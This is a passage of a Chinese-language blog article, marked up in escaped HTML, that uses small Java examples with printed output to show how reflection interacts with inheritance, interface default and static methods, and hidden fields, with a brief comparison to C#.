&lt;code readability=&quot;2&quot;&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;default&lt;/span&gt; java.lang.&lt;span&gt;String&lt;/span&gt; org.cnt.java.reflect.method.Inter.m3()&lt;br/&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;default&lt;/span&gt; java.lang.&lt;span&gt;String&lt;/span&gt; org.cnt.java.reflect.method.Inter.m3()&lt;p&gt;im3 == cm3 -&amp;gt; &lt;span&gt;false&lt;/span&gt;&lt;br/&gt;im3.&lt;span&gt;equals&lt;/span&gt;(cm3) -&amp;gt; &lt;span&gt;&lt;strong&gt;&lt;span&gt;true&lt;/span&gt;&lt;/strong&gt;&lt;/span&gt;&lt;br/&gt;&lt;/p&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;br/&gt;&lt;span&gt;发现输出的都是接口的方法，它们虽然&lt;/span&gt;&lt;span&gt;不&lt;/span&gt;&lt;span&gt;相同（same），但是却&lt;/span&gt;&lt;span&gt;相等&lt;/span&gt;&lt;span&gt;（equal）。因为实现类只是简单的继承，并没有重写。&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;这两个方法都在实现类的对象上反射调用，输出如下：&lt;/span&gt;&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;&lt;span&gt;Inter&lt;/span&gt;&lt;span&gt;.m3&lt;/span&gt;&lt;br/&gt;&lt;span&gt;Inter&lt;/span&gt;&lt;span&gt;.m3&lt;/span&gt;&lt;br/&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;br/&gt;&lt;span&gt;都输出的是接口的默认实现。&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;因为接口也可以包含&lt;/span&gt;&lt;span&gt;静态&lt;/span&gt;&lt;span&gt;方法，索性都测试了吧。&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;m4&lt;/span&gt;&lt;span&gt;就是接口静态方法，也分别从接口和实现类来获取方法m4，并进行输出：&lt;/span&gt;&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;&lt;span&gt;Method&lt;/span&gt; im4 = Inter.class.getDeclaredMethod(&lt;span&gt;&quot;m4&quot;&lt;/span&gt;);&lt;br/&gt;&lt;span&gt;Method&lt;/span&gt; cm4 = Impl.class.getMethod(&lt;span&gt;&quot;m4&quot;&lt;/span&gt;);&lt;br/&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;br/&gt;&lt;span&gt;输出如下：&lt;/span&gt;&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;java&lt;/span&gt;&lt;span&gt;.lang&lt;/span&gt;&lt;span&gt;.String&lt;/span&gt; &lt;span&gt;org&lt;/span&gt;&lt;span&gt;.cnt&lt;/span&gt;&lt;span&gt;.java&lt;/span&gt;&lt;span&gt;.reflect&lt;/span&gt;&lt;span&gt;.method&lt;/span&gt;&lt;span&gt;.Inter&lt;/span&gt;&lt;span&gt;.m4&lt;/span&gt;()&lt;br/&gt;&lt;span&gt;NoSuchMethodException&lt;/span&gt;&lt;br/&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;br/&gt;&lt;span&gt;从&lt;/span&gt;&lt;span&gt;接口&lt;/span&gt;&lt;span&gt;获取静态方法&lt;/span&gt;&lt;span&gt;正常&lt;/span&gt;&lt;span&gt;，从&lt;/span&gt;&lt;span&gt;实现类&lt;/span&gt;&lt;span&gt;获取静态方法&lt;/span&gt;&lt;span&gt;报错&lt;/span&gt;&lt;span&gt;。表明&lt;/span&gt;&lt;span&gt;实现类不会继承接口的静态方法&lt;/span&gt;&lt;span&gt;。&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;通过反射调用接口静态方法：&lt;/span&gt;&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;&lt;span&gt;Log&lt;/span&gt;.&lt;span&gt;log&lt;/span&gt;(im4.invoke(&lt;span&gt;null&lt;/span&gt;));&lt;br/&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;br/&gt;&lt;span&gt;静态方法属于&lt;/span&gt;&lt;span&gt;类&lt;/span&gt;&lt;span&gt;（也称类型）本身，调用时&lt;/span&gt;&lt;span&gt;不&lt;/span&gt;&lt;span&gt;需要对象，所以参数传null（或任意对象都行）即可。&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;也可以使用接口直接调用静态方法：&lt;/span&gt;&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;&lt;span&gt;Log&lt;/span&gt;&lt;span&gt;.log&lt;/span&gt;(&lt;span&gt;Inter&lt;/span&gt;&lt;span&gt;.m4&lt;/span&gt;());&lt;br/&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;br/&gt;&lt;span&gt;输出结果自然都是Inter.m4。&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;strong&gt;&lt;span&gt;编程新说注&lt;/span&gt;&lt;/strong&gt;&lt;span&gt;：实现类不能调用接口的静态方法，接口的静态方法只能由接口本身调用，但子类可以调用父类的静态方法。&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;&lt;strong&gt;&lt;span&gt;字段的继承问题&lt;/span&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;我也是脑洞大开，竟然想到用字段进行测试。那就开始吧。&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;先准备一个父类，含有三个字段。&lt;/span&gt;&lt;/p&gt;
&lt;pre readability=&quot;6&quot;&gt;
&lt;code readability=&quot;6&quot;&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt; Parent3 {&lt;p&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;String&lt;/span&gt; f1 = &lt;span&gt;&quot;Parent3.f1&quot;&lt;/span&gt;;&lt;/p&gt;&lt;p&gt;protected &lt;span&gt;String&lt;/span&gt; f2 = &lt;span&gt;&quot;Parent3.f2&quot;&lt;/span&gt;;&lt;/p&gt;&lt;p&gt;&lt;span&gt;private&lt;/span&gt; &lt;span&gt;String&lt;/span&gt; f3 = &lt;span&gt;&quot;Parent3.f3&quot;&lt;/span&gt;;&lt;br/&gt;}&lt;br/&gt;&lt;/p&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;br/&gt;&lt;span&gt;再准备一个子类，继承父类，且含有三个相同的字段。&lt;br/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;pre readability=&quot;6&quot;&gt;
&lt;code readability=&quot;6&quot;&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;&lt;span&gt;class&lt;/span&gt; &lt;span&gt;Child3&lt;/span&gt; &lt;span&gt;extends&lt;/span&gt; &lt;span&gt;Parent3&lt;/span&gt; &lt;/span&gt;{&lt;p&gt;&lt;span&gt;public&lt;/span&gt; String f1 = &lt;span&gt;&quot;Child3.f1&quot;&lt;/span&gt;;&lt;/p&gt;&lt;p&gt;&lt;span&gt;protected&lt;/span&gt; String f2 = &lt;span&gt;&quot;Child3.f2&quot;&lt;/span&gt;;&lt;/p&gt;&lt;p&gt;&lt;span&gt;private&lt;/span&gt; String f3 = &lt;span&gt;&quot;Child3.f3&quot;&lt;/span&gt;;&lt;br/&gt;}&lt;br/&gt;&lt;/p&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;br/&gt;&lt;span&gt;纳尼&lt;/span&gt;&lt;span&gt;，子类可以定义和父类&lt;/span&gt;&lt;span&gt;同名&lt;/span&gt;&lt;span&gt;的字段，而且也&lt;/span&gt;&lt;span&gt;不&lt;/span&gt;&lt;span&gt;报错，关键IDE也&lt;/span&gt;&lt;span&gt;没有&lt;/span&gt;&lt;span&gt;提示。&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;请允许我&lt;/span&gt;&lt;span&gt;吐槽&lt;/span&gt;&lt;span&gt;几句，人们都说C#是一门&lt;/span&gt;&lt;span&gt;优雅&lt;/span&gt;&lt;span&gt;的语言，优雅在哪里呢？来见识下。&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;先写基类（C#里喜欢叫基类，Java里喜欢叫父类）：&lt;/span&gt;&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;&lt;span&gt;class&lt;/span&gt; &lt;span&gt;CsBase&lt;/span&gt; {&lt;/span&gt;&lt;br/&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;string&lt;/span&gt; name = &lt;span&gt;&quot;李新杰&quot;&lt;/span&gt;;&lt;br/&gt;}&lt;br/&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;br/&gt;&lt;span&gt;再写继承类：&lt;/span&gt;&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;&lt;span&gt;class&lt;/span&gt; &lt;span&gt;CsInherit&lt;/span&gt; :&lt;/span&gt; CsBase {&lt;br/&gt;&lt;span&gt;&lt;strong&gt;&lt;span&gt;new&lt;/span&gt;&lt;/strong&gt;&lt;/span&gt; &lt;span&gt;public&lt;/span&gt; &lt;span&gt;string&lt;/span&gt; name = &lt;span&gt;&quot;编程新说&quot;&lt;/span&gt;;&lt;br/&gt;}&lt;br/&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;br/&gt;&lt;span&gt;看到了吧，子类要想&lt;/span&gt;&lt;span&gt;覆盖&lt;/span&gt;&lt;span&gt;（即&lt;/span&gt;&lt;span&gt;遮罩&lt;/span&gt;&lt;span&gt;）父类里的成员，需要加一个&lt;/span&gt;&lt;span&gt;new&lt;/span&gt;&lt;span&gt;关键字，提示一下写代码的人，&lt;/span&gt;&lt;span&gt;让他知道自己在干什么&lt;/span&gt;&lt;span&gt;，别无意间弄错了。&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;这就是优雅，而Java呢，啥玩意儿都没有，存在出错的风险吧，当然其实一般也没有问题。&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;strong&gt;&lt;span&gt;一吐为快&lt;/span&gt;&lt;/strong&gt;&lt;span&gt;：&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;C#就是一杯咖啡，即使不加奶不加糖不需要搅拌的时候也会给你一把小勺子，让你随意的搅动两下，体现一下优雅。&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;Java就是一个大蒜，不仅听到后就掉了档次，而且有人吃的时候连蒜皮都不剥，直接用嘴咬，然后再把皮吐出来。&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;这是以前郭德纲和周立波互喷的时候说的喝咖啡的高雅，吃大蒜的低俗，我这里借鉴过来再演绎一下，哈哈。&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;简单自嗨一下，不必当真，Java和C#在语法上的细节差异，主要是语言之父们的&lt;/span&gt;&lt;span&gt;哲学思维&lt;/span&gt;&lt;span&gt;不同，但是都说得通。&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;这就像是，靠左走还是靠右走好呢？没啥区别，定好规则即可。&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;言归正传，分别获取子类和父类的f1字段并进行输出：&lt;/span&gt;&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;java&lt;/span&gt;&lt;span&gt;.lang&lt;/span&gt;&lt;span&gt;.String&lt;/span&gt; &lt;span&gt;org&lt;/span&gt;&lt;span&gt;.cnt&lt;/span&gt;&lt;span&gt;.java&lt;/span&gt;&lt;span&gt;.reflect&lt;/span&gt;&lt;span&gt;.method&lt;/span&gt;&lt;span&gt;.Parent3&lt;/span&gt;&lt;span&gt;.f1&lt;/span&gt;&lt;br/&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;java&lt;/span&gt;&lt;span&gt;.lang&lt;/span&gt;&lt;span&gt;.String&lt;/span&gt; &lt;span&gt;org&lt;/span&gt;&lt;span&gt;.cnt&lt;/span&gt;&lt;span&gt;.java&lt;/span&gt;&lt;span&gt;.reflect&lt;/span&gt;&lt;span&gt;.method&lt;/span&gt;&lt;span&gt;.Child3&lt;/span&gt;&lt;span&gt;.f1&lt;/span&gt;&lt;p&gt;&lt;span&gt;pf1&lt;/span&gt;&lt;span&gt;.equals&lt;/span&gt;(&lt;span&gt;cf1&lt;/span&gt;) &lt;span&gt;-&lt;/span&gt;&amp;gt; &lt;span&gt;false&lt;/span&gt;&lt;br/&gt;&lt;/p&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;br/&gt;&lt;span&gt;这两个字段不相等。&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;然后分别实例化父类和子类：&lt;/span&gt;&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;Parent3 p = &lt;span&gt;new&lt;/span&gt; Parent3();&lt;br/&gt;Child3 c = &lt;span&gt;new&lt;/span&gt; Child3();&lt;br/&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;br/&gt;&lt;span&gt;父类字段分别在父类和子类实例上反射调用：&lt;/span&gt;&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;&lt;span&gt;Log&lt;/span&gt;.&lt;span&gt;log&lt;/span&gt;(pf1.&lt;span&gt;get&lt;/span&gt;(p));&lt;br/&gt;&lt;span&gt;Log&lt;/span&gt;.&lt;span&gt;log&lt;/span&gt;(pf1.&lt;span&gt;get&lt;/span&gt;(c));&lt;br/&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;br/&gt;&lt;span&gt;输出如下：&lt;/span&gt;&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;&lt;span&gt;Parent3&lt;/span&gt;&lt;span&gt;.f1&lt;/span&gt;&lt;br/&gt;&lt;span&gt;Parent3&lt;/span&gt;&lt;span&gt;.f1&lt;/span&gt;&lt;br/&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;br/&gt;&lt;span&gt;可以看到，输出的&lt;/span&gt;&lt;span&gt;都是&lt;/span&gt;&lt;span&gt;父类&lt;/span&gt;&lt;span&gt;的字段值。&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;子类字段分别在父类和子类对象上反射调用：&lt;/span&gt;&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;&lt;span&gt;Log&lt;/span&gt;.&lt;span&gt;log&lt;/span&gt;(cf1.&lt;span&gt;get&lt;/span&gt;(p));&lt;br/&gt;&lt;span&gt;Log&lt;/span&gt;.&lt;span&gt;log&lt;/span&gt;(cf1.&lt;span&gt;get&lt;/span&gt;(c));&lt;br/&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;br/&gt;&lt;span&gt;输出如下：&lt;/span&gt;&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;&lt;span&gt;IllegalArgumentException&lt;/span&gt;&lt;br/&gt;&lt;span&gt;Child3&lt;/span&gt;&lt;span&gt;.f1&lt;/span&gt;&lt;br/&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;br/&gt;&lt;span&gt;子类字段在父类对象上反射调用时&lt;/span&gt;&lt;span&gt;报错&lt;/span&gt;&lt;span&gt;。&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;子类字段在子类对象上反射调用时输出的是子类的字段值。&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;用相同的方法对字段&lt;/span&gt;&lt;span&gt;f2&lt;/span&gt;&lt;span&gt;和&lt;/span&gt;&lt;span&gt;f3&lt;/span&gt;&lt;span&gt;进行测试，得到的结果是&lt;/span&gt;&lt;span&gt;一样&lt;/span&gt;&lt;span&gt;的。即使一个是&lt;/span&gt;&lt;span&gt;protected&lt;/span&gt;&lt;span&gt;的，一个是&lt;/span&gt;&lt;span&gt;private&lt;/span&gt;&lt;span&gt;的。&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;&lt;strong&gt;&lt;span&gt;结论&lt;/span&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;看了这么多，相信都已迫不及待的想知道结论了。那就一起总结下吧。&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;总的来看，反射调用输出的结果和直接使用对象调用是&lt;/span&gt;&lt;span&gt;一样&lt;/span&gt;&lt;span&gt;的，说明反射调用也是&lt;/span&gt;&lt;span&gt;支持&lt;/span&gt;&lt;span&gt;面向对象的多态特性的。不然就乱套了嘛。&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;使用对象调用时，会根据运行时对象的&lt;/span&gt;&lt;span&gt;具体&lt;/span&gt;&lt;span&gt;类型，找出该类型对父类方法的&lt;/span&gt;&lt;span&gt;重写&lt;/span&gt;&lt;span&gt;版本或&lt;/span&gt;&lt;span&gt;继承&lt;/span&gt;&lt;span&gt;版本，然后再在对象上调用这个版本的方法。&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;对于反射也是完全一样的，它也关注这两个东西，哪个&lt;/span&gt;&lt;span&gt;方法&lt;/span&gt;&lt;span&gt;和哪个&lt;/span&gt;&lt;span&gt;运行时对象&lt;/span&gt;&lt;span&gt;。&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;反射调用与继承重写结合后的规则是这样的：&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;对于&lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt;和&lt;/span&gt;&lt;span&gt;protected&lt;/span&gt;&lt;span&gt;的&lt;/span&gt;&lt;span&gt;方法&lt;/span&gt;&lt;span&gt;，由于可以被继承与重写，所以真正起作用的是&lt;/span&gt;&lt;span&gt;运行时对象&lt;/span&gt;&lt;span&gt;，跟方法（反射获取的Method）无关。&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;无论它是从接口获取的，还是从父类获取的，或是从子类获取的，或者说是抽象的，都无所谓，关键看在哪个对象上调用。&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;对于&lt;/span&gt;&lt;span&gt;private&lt;/span&gt;&lt;span&gt;的&lt;/span&gt;&lt;span&gt;方法&lt;/span&gt;&lt;span&gt;，由于不能被继承与重写，所以真正起作用的就是&lt;/span&gt;&lt;span&gt;方法&lt;/span&gt;&lt;span&gt;（反射获取的Method）&lt;/span&gt;&lt;span&gt;本身&lt;/span&gt;&lt;span&gt;，而与运行时对象无关。&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;对于&lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt;和&lt;/span&gt;&lt;span&gt;protected&lt;/span&gt;&lt;span&gt;的&lt;/span&gt;&lt;span&gt;字段&lt;/span&gt;&lt;span&gt;，可以被继承，但是面向对象规定字段是&lt;/span&gt;&lt;span&gt;不可以&lt;/span&gt;&lt;span&gt;被重写的，所以真正起作用的就是&lt;/span&gt;&lt;span&gt;字段&lt;/span&gt;&lt;span&gt;（反射获取的Field）&lt;/span&gt;&lt;span&gt;本身&lt;/span&gt;&lt;span&gt;，而与运行时对象无关。&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;对于&lt;/span&gt;&lt;span&gt;private&lt;/span&gt;&lt;span&gt;的&lt;/span&gt;&lt;span&gt;字段&lt;/span&gt;&lt;span&gt;，不可以被继承，也不能被重写，所以真正起作用的就是&lt;/span&gt;&lt;span&gt;字段&lt;/span&gt;&lt;span&gt;（反射获取的Field）&lt;/span&gt;&lt;span&gt;本身&lt;/span&gt;&lt;span&gt;，而与运行时对象无关。&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;哈哈，应该明白过来了吧，&lt;/span&gt;&lt;span&gt;这不就是面向对象的特性嘛&lt;/span&gt;&lt;span&gt;，谁说不是呢。因为反射调用也是要&lt;/span&gt;&lt;span&gt;遵从&lt;/span&gt;&lt;span&gt;面向对象的规则的。&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;还有一点，父类的字段和方法可以在子类对象上反射调用，因为子类是父类的一个特殊分支，子类继承了父类嘛。&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;但是，子类自己定义的字段与方法或者重写了的方法，不可以在父类对象上反射调用，因为父类不能转换为子类。&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;好比，可以说人是动物，但反过来，说动物是人就不对了。测试中遇到的报错就属于这种情况，这种规则也是面向对象规定的。&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;这就是反射和面向对象结合的惊艳，如果都明白了文章中的示例，那也就明白了这种惊艳。&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;此外，反射至少还有以下两个&lt;/span&gt;&lt;span&gt;好处&lt;/span&gt;&lt;span&gt;：&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;1）&lt;/span&gt;&lt;span&gt;写法统一&lt;/span&gt;&lt;span&gt;，不管什么类的什么方法，都是method.invoke(..)来调用，很适合用作框架开发，因为框架要求的就是统一模型或写法。&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;2）&lt;/span&gt;&lt;span&gt;支持&lt;/span&gt;&lt;span&gt;了面向对象的&lt;/span&gt;&lt;span&gt;特征&lt;/span&gt;&lt;span&gt;，且&lt;/span&gt;&lt;span&gt;突破&lt;/span&gt;&lt;span&gt;了面向对象的&lt;/span&gt;&lt;span&gt;限制&lt;/span&gt;&lt;span&gt;，因为反射可以调用父类的&lt;/span&gt;&lt;span&gt;私有&lt;/span&gt;&lt;span&gt;方法和&lt;/span&gt;&lt;span&gt;私有&lt;/span&gt;&lt;span&gt;字段，还可以在类的&lt;/span&gt;&lt;span&gt;外面&lt;/span&gt;&lt;span&gt;调用它的&lt;/span&gt;&lt;span&gt;私有&lt;/span&gt;&lt;span&gt;和&lt;/span&gt;&lt;span&gt;受保护&lt;/span&gt;&lt;span&gt;的方法和字段。&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;我之前写过一篇&lt;/span&gt;&lt;span&gt;分析&lt;/span&gt;&lt;span&gt;面向对象的文章《&lt;a href=&quot;http://mp.weixin.qq.com/s?__biz=MzU1NzY1Nzc1OQ==&amp;amp;mid=2247484013&amp;amp;idx=1&amp;amp;sn=ebdf4f8e952dae58fb2998e10f6194ce&amp;amp;chksm=fc33399dcb44b08beedb19eee5e20271882a49c971ac2013a472391291b8a04d24b61c9c2004&amp;amp;scene=21#wechat_redirect&quot; target=&quot;_blank&quot; data-itemshowtype=&quot;0&quot; data-linktype=&quot;2&quot;&gt;&lt;span&gt;三个臭皮匠的OO哲学，from C++、C# and Java&lt;/span&gt;&lt;/a&gt;》，那里有比较深刻的思考，&lt;/span&gt;&lt;span&gt;推荐&lt;/span&gt;&lt;span&gt;一看。&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;示例完整源码&lt;/span&gt;&lt;span&gt;：&lt;/span&gt;&lt;br/&gt;&lt;span&gt;https://github.com/coding-new-talking/java-code-demo.git&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;span&gt;&lt;strong&gt;&lt;span&gt;&amp;gt;&amp;gt;&amp;gt; 热门文章集锦 &amp;lt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;http://mp.weixin.qq.com/s?__biz=MzU1NzY1Nzc1OQ==&amp;amp;mid=2247484219&amp;amp;idx=1&amp;amp;sn=e6c39138e44ce8f0c91aba4873fb42cd&amp;amp;chksm=fc3338cbcb44b1dde7ae372ed66b40bdf4f755d711008810eb837a8f78d884f00956ae7ce7a7&amp;amp;scene=21#wechat_redirect&quot; target=&quot;_blank&quot; data-itemshowtype=&quot;0&quot; data-linktype=&quot;2&quot;&gt;&lt;span&gt;毕业10年，我有话说&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://mp.weixin.qq.com/s?__biz=MzU1NzY1Nzc1OQ==&amp;amp;mid=2247483949&amp;amp;idx=1&amp;amp;sn=200c9ac4f8e4e877b0b253d45205712a&amp;amp;chksm=fc3339ddcb44b0cb5ac2957dbed41b2f9e11fbba14967d00f97012806a9d6af364b0f8135eee&amp;amp;scene=21#wechat_redirect&quot; target=&quot;_blank&quot; data-itemshowtype=&quot;0&quot; data-linktype=&quot;2&quot;&gt;&lt;span&gt;【面试】我是如何面试别人List相关知识的，深度有点长文&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://mp.weixin.qq.com/s?__biz=MzU1NzY1Nzc1OQ==&amp;amp;mid=2247483989&amp;amp;idx=1&amp;amp;sn=cf9ce5c3f7981c16b71047b868b1c1ab&amp;amp;chksm=fc3339a5cb44b0b3df524ce684e8cd76ab6d15a2ccf26ec2425ecbcdd26bc777b95a06994189&amp;amp;scene=21#wechat_redirect&quot; target=&quot;_blank&quot; data-itemshowtype=&quot;0&quot; data-linktype=&quot;2&quot;&gt;&lt;span&gt;我是如何在毕业不久只用1年就升为开发组长的&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://mp.weixin.qq.com/s?__biz=MzU1NzY1Nzc1OQ==&amp;amp;mid=2247483994&amp;amp;idx=1&amp;amp;sn=fb09e943331e89abcb99d8304ea6b677&amp;amp;chksm=fc3339aacb44b0bc2a120c79efebb46a43ce5b4d3148992d86b2841a89bb46bf5d8863e065ea&amp;amp;scene=21#wechat_redirect&quot; target=&quot;_blank&quot; data-itemshowtype=&quot;0&quot; data-linktype=&quot;2&quot;&gt;&lt;span&gt;爸爸又给Spring MVC生了个弟弟叫Spring WebFlux&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://mp.weixin.qq.com/s?__biz=MzU1NzY1Nzc1OQ==&amp;amp;mid=2247484017&amp;amp;idx=1&amp;amp;sn=a2055640b142fc4cfa5a9901d22ec57f&amp;amp;chksm=fc333981cb44b09782c196da25dc613b38a9ede52de073bfaaaef6214a9deb294b6527091892&amp;amp;scene=21#wechat_redirect&quot; target=&quot;_blank&quot; data-itemshowtype=&quot;0&quot; data-linktype=&quot;2&quot;&gt;&lt;span&gt;【面试】我是如何在面试别人Spring事务时“套路”对方的&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://mp.weixin.qq.com/s?__biz=MzU1NzY1Nzc1OQ==&amp;amp;mid=2247484029&amp;amp;idx=1&amp;amp;sn=44b05473af37fe008bb9659a35d1a9de&amp;amp;chksm=fc33398dcb44b09bbd25a7e14e7100419988479fbeb4bda7787f1b93dd932ec699dfd793df04&amp;amp;scene=21#wechat_redirect&quot; target=&quot;_blank&quot; data-itemshowtype=&quot;0&quot; data-linktype=&quot;2&quot;&gt;&lt;span&gt;【面试】Spring事务面试考点吐血整理（建议珍藏）&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://mp.weixin.qq.com/s?__biz=MzU1NzY1Nzc1OQ==&amp;amp;mid=2247484158&amp;amp;idx=1&amp;amp;sn=1ca952ba9166c5ccf0e3f40622335fc5&amp;amp;chksm=fc33390ecb44b01898bb2500ba61a15e38487a23f5c0405d738cc4c272cd705d2dbbf1a3f8e7&amp;amp;scene=21#wechat_redirect&quot; target=&quot;_blank&quot; data-itemshowtype=&quot;0&quot; data-linktype=&quot;2&quot;&gt;&lt;span&gt;【面试】我是如何在面试别人Redis相关知识时“软怼”他的&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://mp.weixin.qq.com/s?__biz=MzU1NzY1Nzc1OQ==&amp;amp;mid=2247484164&amp;amp;idx=1&amp;amp;sn=390d911b19812d22aebd3f0f6522004c&amp;amp;chksm=fc3338f4cb44b1e20bc2344474586934a2b148f92eefdaecf134d57af10f64310579e196904a&amp;amp;scene=21#wechat_redirect&quot; target=&quot;_blank&quot; data-itemshowtype=&quot;0&quot; data-linktype=&quot;2&quot;&gt;&lt;span&gt;【面试】吃透了这些Redis知识点，面试官一定觉得你很NB（干货 | 建议珍藏）&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://mp.weixin.qq.com/s?__biz=MzU1NzY1Nzc1OQ==&amp;amp;mid=2247484184&amp;amp;idx=1&amp;amp;sn=37007efde0cc93e48c55a133dc9cc8d4&amp;amp;chksm=fc3338e8cb44b1fea0ed4af7f01de658e8a1bc7f573cb5bde2701d9b09ba14747139d2bcea39&amp;amp;scene=21#wechat_redirect&quot; target=&quot;_blank&quot; data-itemshowtype=&quot;0&quot; data-linktype=&quot;2&quot;&gt;&lt;span&gt;【面试】如果你这样回答“什么是线程安全”，面试官都会对你刮目相看（建议珍藏）&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;
